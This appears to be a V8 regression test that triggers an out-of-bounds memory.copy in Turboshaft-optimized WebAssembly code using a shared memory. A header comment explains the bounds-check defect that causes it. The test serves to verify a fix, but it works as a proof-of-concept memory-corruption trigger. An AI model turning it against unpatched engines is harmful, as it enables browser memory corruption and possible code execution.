// Witness for a residual out-of-bounds in Turboshaft bounds checks for shared
// WebAssembly memories.
//
// The engine now stores, for shared memories, the *address* of the backing
// store's atomic byte length in the "size" slot of the trusted instance data
// (so that cross-thread growth is visible). `memory.size` and the C++ runtime
// helpers dereference that address correctly. However, the Turboshaft size
// loaders used by the dynamic bounds checks (MemSize / LoadMemSize) return the
// stored word directly without dereferencing it. For a shared memory that word
// is a heap pointer, which is interpreted as an enormous byte length, so every
// dynamic bounds check (here: memory.copy) trivially succeeds and the access
// escapes the real backing store.
//
// On the fixed tree the bounds check uses the true byte length and the copy
// traps with a RangeError. On the vulnerable tree the copy performs a raw
// libc memmove far outside the reservation -> SIGSEGV / ASan error.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const builder = new WasmModuleBuilder();
// Shared, growable memory: initial 1 page, maximum 10 pages.
builder.addMemory(1, 10, /*shared=*/ true);
builder.exportMemoryAs('mem');

// copy(dst, src, n): memory.copy with a large destination offset.
builder.addFunction('copy', makeSig([kWasmI32, kWasmI32, kWasmI32], []))
    .addBody([
      kExprLocalGet, 0,  // dst
      kExprLocalGet, 1,  // src
      kExprLocalGet, 2,  // n
      kNumericPrefix, kExprMemoryCopy, 0, 0,
    ])
    .exportFunc();

const instance = builder.instantiate();
const copy = instance.exports.copy;

// Sanity: an in-bounds copy must still work on both trees.
copy(0, 0, 16);

// Force optimized (Turboshaft) code, where the defective size loaders live.
%WasmTierUpFunction(copy);

// Destination 128 MiB: far beyond the 1-page (64 KiB) backing store and beyond
// the shared-memory reservation. On the fixed tree this traps cleanly.
const DST = 0x08000000;  // 128 MiB
try {
  copy(DST, 0, 4096);
} catch (e) {
  // Fixed tree: the bounds check sees the real size and traps cleanly.
  print('trapped as expected: ' + e);
}
print('no crash');
